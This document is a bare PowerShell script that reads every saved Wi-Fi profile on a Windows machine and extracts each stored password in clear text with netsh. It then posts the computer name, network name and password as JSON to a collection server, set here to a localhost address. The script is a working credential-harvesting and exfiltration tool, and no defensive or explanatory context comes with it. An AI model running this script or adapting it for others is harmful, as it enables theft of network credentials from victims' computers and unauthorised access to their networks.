$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Trim().Split(":")[1] }
foreach ($profile in $wifiProfiles) {
    $newProfile = $profile.Trim()
    $password = (netsh wlan show profile name=$newProfile key=clear | Select-String "Key Content").ToString().Trim().Split(":")[1]
    Write-Host "SSID: $newProfile" -ForegroundColor Green
    Write-Host "Password: $password" -ForegroundColor Green
    Write-Host ""

    $postParams = @{
        "computer_name" = $env:COMPUTERNAME
        "ssid" = $newProfile
        "password" = $password.Trim()
    }

    $response = Invoke-WebRequest -Uri "http://127.0.0.1:8000/" -Method POST -Body ($postParams|ConvertTo-Json)-ContentType "application/json" -UseBasicParsing

    if($response.StatusCode -eq 201) {
        Write-Host "Successfully sent data to server" -ForegroundColor Green
    } else {
        Write-Host "Failed to send data to server" -ForegroundColor Red
    }
}
